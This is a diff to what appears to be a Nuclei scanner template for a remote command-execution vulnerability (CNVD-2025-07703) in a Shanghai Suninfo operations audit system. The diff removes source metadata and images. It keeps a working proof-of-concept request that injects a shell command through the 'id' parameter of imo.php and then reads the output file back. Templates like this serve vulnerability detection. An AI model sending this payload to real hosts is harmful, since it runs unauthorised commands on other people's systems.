@@ -3,12 +3,8 @@ info:
   name: 上海上讯信息技术股份有限公司运维管理审计系统imo.php存在命令执行漏洞(CNVD-2025-07703)
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/raubdp8abkltgbmo'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: raubdp8abkltgbmo
-    fofa: body="/default/switchlocale" || body="default/getloginhtml"
 http:
 - raw:
   - 'GET /api/imo.php?type=immediate&id=|id>rce.txt| HTTP/1.1
@@ -23,7 +19,6 @@ http:
 
     Accept-Encoding: gzip, deflate
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749286616845-cd349cb5-d5a5-44fe-9801-ceabcd286263.png)
 
     验证url'
   redirects: false
@@ -34,9 +29,7 @@ http:
 - raw:
   - 'GET /api/rce.txt HTTP/1.1
 
-    Host: {{Hostname}}
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749286617115-32a3d454-d5b6-4044-bb85-7eb1a4bcea29.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
